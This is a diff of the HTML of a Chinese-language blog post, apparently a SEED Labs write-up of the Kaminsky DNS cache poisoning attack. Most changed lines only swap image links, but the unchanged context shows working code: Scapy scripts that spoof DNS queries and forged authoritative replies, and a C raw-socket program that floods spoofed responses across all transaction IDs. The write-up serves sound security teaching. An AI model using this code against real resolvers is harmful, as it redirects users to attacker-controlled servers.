@@ -23,25 +23,10 @@
 <meta property="og:site_name" content="kaikaikai&#39;s blog">
 <meta property="og:description" content="1. Lab Overview 本实验的目的是让学生获得远程 DNS 缓存中毒攻击（也称为 Kaminsky DNS 攻击）的第一手经验。DNS（域名系统）是互联网的电话簿；它将主机名转换为 IP 地址，反之亦然。这种转换是通过在幕后进行的 DNS 解析完成的。DNS 攻击以各种方式操纵这一解析过程，目的是将用户误导到其他目的地，而这些目的地往往是恶意的。本实验室重点研究一种特殊的 DN">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129105011202.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129105141034.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129105250433.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129105421475.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129105529577.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129105637553.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129105736769.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129105936728.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129110057918.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129110110331.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129110205945.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129110216900.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129110247918.png">
-<meta property="og:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129110258933.png">
 <meta property="article:published_time" content="2023-11-29T02:48:23.000Z">
-<meta property="article:modified_time" content="2023-11-29T03:03:10.706Z">
+<meta property="article:modified_time" content="2023-11-29T03:05:08.724Z">
 <meta property="article:author" content="kaikaikai">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/11/29/SEED-LABS/Network%20Security/The%20Kaminsky%20Attack/The%20Kaminsky%20Attack.assets/image-20231129105011202.png">
   
   
   
@@ -293,7 +278,8 @@ DNS
 </ul>
 <h1 id="lab-environment-setuptask1">2. Lab Environment Setup(Task1)</h1>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129105011202.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103586.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129105011202" />
 <figcaption aria-hidden="true">image-20231129105011202</figcaption>
 </figure>
@@ -317,7 +303,8 @@ dig 命令查找 www.example.com 的 IP 地址时，本地 DNS
 地址，这样返回的IP地址可以是攻击者决定的任何数字。结果，用户将被引导到攻击者的网站，而不是真实的
 <a target="_blank" rel="noopener" href="http://www.example.com">www.example.com</a>。</p>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129105141034.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103587.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129105141034" />
 <figcaption aria-hidden="true">image-20231129105141034</figcaption>
 </figure>
@@ -329,7 +316,8 @@ alt="image-20231129105141034" />
 缓存，查询将不会通过根服务器或 .COM
 服务器；如下图所示。在本实验室中，下图所示的情况更为常见，因此我们将以此图为基础描述攻击机制。</p>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129105250433.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103588.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129105250433" />
 <figcaption aria-hidden="true">image-20231129105250433</figcaption>
 </figure>
@@ -395,7 +383,8 @@ Wireshark）他们的查询可以触发目标 DNS 服务器发送相应的 DNS
 Scapy）编写这段代码。Python
 代码片段如下（+++为占位符，学生需要用实际值替换）：</p>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129105421475.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103589.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129105421475" />
 <figcaption aria-hidden="true">image-20231129105421475</figcaption>
 </figure>
@@ -405,7 +394,8 @@ alt="image-20231129105421475" />
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 创建DNS查询部分，指定查询域名为&#x27;kkk.example.com&#x27;</span><br>Qdsec = DNSQR(qname=<span class="hljs-string">&#x27;kkk.example.com&#x27;</span>)<br><br><span class="hljs-comment"># 创建DNS消息，设置ID为0xAAAA，查询计数为1，回答计数、授权计数和附加记录计数均为0</span><br>dns = DNS(<span class="hljs-built_in">id</span>=<span class="hljs-number">0xAAAA</span>, qr=<span class="hljs-number">0</span>, qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">0</span>, nscount=<span class="hljs-number">0</span>, arcount=<span class="hljs-number">0</span>, qd=Qdsec)<br><br><span class="hljs-comment"># 创建IP数据包，指定目标IP地址为&#x27;10.9.0.53&#x27;，源IP地址为&#x27;10.9.0.5&#x27;</span><br>ip = IP(dst=<span class="hljs-string">&#x27;10.9.0.53&#x27;</span>, src=<span class="hljs-string">&#x27;10.9.0.5&#x27;</span>)<br><br><span class="hljs-comment"># 创建UDP数据包，指定目标端口为53，源端口为12345，校验和为0</span><br>udp = UDP(dport=<span class="hljs-number">53</span>, sport=<span class="hljs-number">12345</span>, chksum=<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># 组合数据包，顺序为IP头部 / UDP头部 / DNS消息</span><br>request = ip / udp / dns<br><br><span class="hljs-comment"># 发送构建的DNS请求数据包</span><br>send(request)<br></code></pre></td></tr></table></figure></li>
 <li><p>开启wireshark监听，运行代码，成功触发本地DNS服务器发出相应的DNS查询。</p>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129105529577.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103590.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129105529577" />
 <figcaption aria-hidden="true">image-20231129105529577</figcaption>
 </figure></li>
@@ -424,7 +414,8 @@ Wireshark 捕获欺骗的 DNS 回复，并证明欺骗的数据包是有效的�
 <ol type="1">
 <li><p>查询example.com 的合法名称服务器的 IP 地址</p>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129105637553.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103591.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129105637553" />
 <figcaption aria-hidden="true">image-20231129105637553</figcaption>
 </figure></li>
@@ -434,7 +425,8 @@ ns为攻击者DNS服务器，目标IP为本地DNS服务器IP，目标端口为33
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>name = <span class="hljs-string">&#x27;www.example.com&#x27;</span>  <span class="hljs-comment"># 攻击目标域名</span><br>domain = <span class="hljs-string">&#x27;example.com&#x27;</span>  <span class="hljs-comment"># 攻击目标域名的父域名</span><br>ns = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>  <span class="hljs-comment"># 恶意名称服务器</span><br>Qdsec = DNSQR(qname=name)<br>Anssec = DNSRR(rrname=name, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;A&#x27;</span>, rdata=<span class="hljs-string">&#x27;1.2.3.4&#x27;</span>, ttl=<span class="hljs-number">259200</span>)<br>NSsec = DNSRR(rrname=domain, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;NS&#x27;</span>, rdata=ns, ttl=<span class="hljs-number">259200</span>)<br>dns = DNS(<span class="hljs-built_in">id</span>=<span class="hljs-number">0xAAAA</span>, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>,<br>          qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">1</span>, arcount=<span class="hljs-number">0</span>,<br>          qd=Qdsec, an=Anssec, ns=NSsec)<br>ip = IP(dst=<span class="hljs-string">&#x27;10.9.0.53&#x27;</span>, src=<span class="hljs-string">&#x27;199.43.133.53&#x27;</span>)  <br>udp = UDP(dport=<span class="hljs-number">33333</span>, sport=<span class="hljs-number">53</span>, chksum=<span class="hljs-number">0</span>) <br>reply = ip/udp/dns<br>send(reply)<br></code></pre></td></tr></table></figure></li>
 <li><p>开启wireshark监听，运行程序，成功捕获到伪造的响应数据包。</p>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129105736769.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103592.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129105736769" />
 <figcaption aria-hidden="true">image-20231129105736769</figcaption>
 </figure></li>
@@ -462,7 +454,8 @@ attacker32.com
 <ol type="1">
 <li><p>将task2和task3构建的数据包保存为二进制文件</p>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129105936728.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103594.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129105936728" />
 <figcaption aria-hidden="true">image-20231129105936728</figcaption>
 </figure></li>
@@ -470,12 +463,14 @@ alt="image-20231129105936728" />
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FILE_SIZE 1000000</span><br><br><span class="hljs-comment">/* IP 头部 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_ihl:<span class="hljs-number">4</span>, <span class="hljs-comment">// IP 头部长度</span><br>                     iph_ver:<span class="hljs-number">4</span>; <span class="hljs-comment">// IP 版本</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_tos; <span class="hljs-comment">// 服务类型</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_len; <span class="hljs-comment">// IP 数据包长度（数据 + 头部）</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_ident; <span class="hljs-comment">// 标识</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_flag:<span class="hljs-number">3</span>, <span class="hljs-comment">// 分片标志</span><br>                     iph_offset:<span class="hljs-number">13</span>; <span class="hljs-comment">// 分片偏移</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_ttl; <span class="hljs-comment">// 存活时间</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_protocol; <span class="hljs-comment">// 协议类型</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_chksum; <span class="hljs-comment">// IP 数据报校验和</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_sourceip</span>;</span> <span class="hljs-comment">// 源 IP 地址 </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_destip</span>;</span>   <span class="hljs-comment">// 目标 IP 地址 </span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_raw_packet</span><span class="hljs-params">(<span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_request</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size, <span class="hljs-type">char</span> * name)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_response</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size, <span class="hljs-type">char</span> * name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> id)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  srand(time(<span class="hljs-literal">NULL</span>));<br>  FILE * f_req = fopen(<span class="hljs-string">&quot;request.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>  <span class="hljs-keyword">if</span> (!f_req) &#123;<br>     perror(<span class="hljs-string">&quot;无法打开 &#x27;request.bin&#x27;&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> requset[MAX_FILE_SIZE];<br>  <span class="hljs-type">int</span> n_req = fread(requset, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_req);<br>  FILE * f_resp = fopen(<span class="hljs-string">&quot;reply.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>  <span class="hljs-keyword">if</span> (!f_resp) &#123;<br>     perror(<span class="hljs-string">&quot;无法打开 &#x27;reply.bin&#x27;&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> reply[MAX_FILE_SIZE];<br>  <span class="hljs-type">int</span> n_resp = fread(reply, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_resp);<br><br>  <span class="hljs-type">char</span> a[<span class="hljs-number">26</span>] = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">6</span>];<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-comment">// 生成长度为 5 的随机名称</span><br>    <span class="hljs-built_in">memset</span>(name, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">5</span>; k++)  <br>      name[k] = a[rand() % <span class="hljs-number">26</span>];<br>    send_dns_request(requset, n_req, name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请求 %s.example.com\n&quot;</span>, name);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">65535</span>; i++) &#123;<br>      send_dns_response(reply, n_resp, name, i);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_request</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size, <span class="hljs-type">char</span> * name)</span> &#123;<br>  <span class="hljs-built_in">memcpy</span>(buffer + <span class="hljs-number">41</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)name, <span class="hljs-number">5</span>);<br>  send_raw_packet(buffer, pkt_size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_response</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size, <span class="hljs-type">char</span> * name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> id)</span> &#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> tmp[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  *tmp = htons(id);<br>  <span class="hljs-built_in">memcpy</span>(buffer + <span class="hljs-number">28</span>, (<span class="hljs-type">void</span>*)tmp, <span class="hljs-number">2</span>);  <br>  <span class="hljs-built_in">memcpy</span>(buffer + <span class="hljs-number">41</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)name, <span class="hljs-number">5</span>);<br>  <span class="hljs-built_in">memcpy</span>(buffer + <span class="hljs-number">64</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)name, <span class="hljs-number">5</span>);<br>  send_raw_packet(buffer, pkt_size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_raw_packet</span><span class="hljs-params">(<span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">dest_info</span>;</span><br>  <span class="hljs-type">int</span> enable = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">// 步骤 1：创建原始网络套接字。</span><br>  <span class="hljs-type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br><br>  <span class="hljs-comment">// 步骤 2：设置套接字选项。</span><br>  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &amp;enable, <span class="hljs-keyword">sizeof</span>(enable));<br><br>  <span class="hljs-comment">// 步骤 3：提供有关目标的必要信息。</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> *<span class="hljs-title">ip</span> =</span> (<span class="hljs-keyword">struct</span> ipheader *) buffer;<br>  dest_info.sin_family = AF_INET;<br>  dest_info.sin_addr = ip-&gt;iph_destip;<br><br>  <span class="hljs-comment">// 步骤 4：发送数据包。</span><br>  sendto(sock, buffer, pkt_size, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;dest_info, <span class="hljs-keyword">sizeof</span>(dest_info));<br>  close(sock);<br>&#125;<br></code></pre></td></tr></table></figure></li>
 <li><p>编译运行攻击代码，一段时间后查看缓存记录，成功实现投毒攻击。</p>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129110057918.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103595.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129110057918" />
 <figcaption aria-hidden="true">image-20231129110057918</figcaption>
 </figure>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129110110331.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103596.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129110110331" />
 <figcaption aria-hidden="true">image-20231129110110331</figcaption>
 </figure></li>
@@ -497,24 +492,28 @@ dig 命令后，DNS 结果可能会缓存在本地 DNS 服务器上。您可以�
 <ol type="1">
 <li><p>运行<code>dig www.example.com</code>:返回1.2.3.5。查询过程：用户-&gt;本地DNS服务器；本地DNS服务器-&gt;攻击者服务器。</p>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129110205945.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103597.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129110205945" />
 <figcaption aria-hidden="true">image-20231129110205945</figcaption>
 </figure>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129110216900.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103598.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129110216900" />
 <figcaption aria-hidden="true">image-20231129110216900</figcaption>
 </figure></li>
 <li><p>清除本地DNS服务器缓存，再次发起攻击，等待攻击成功。</p></li>
 <li><p>运行<code>dig @ns.attacker32.com www.example.com</code>：返回1.2.3.5。查询过程：用户-&gt;本地DNS服务器；本地DNS服务器-&gt;用户（返回攻击者服务器地址）；用户-&gt;攻击者DNS服务器。</p>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129110247918.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103599.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129110247918" />
 <figcaption aria-hidden="true">image-20231129110247918</figcaption>
 </figure>
 <figure>
-<img src="The%20Kaminsky%20Attack.assets/image-20231129110258933.png" srcset="/img/loading.gif" lazyload
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291103600.png" srcset="/img/loading.gif" lazyload
 alt="image-20231129110258933" />
 <figcaption aria-hidden="true">image-20231129110258933</figcaption>
 </figure></li>
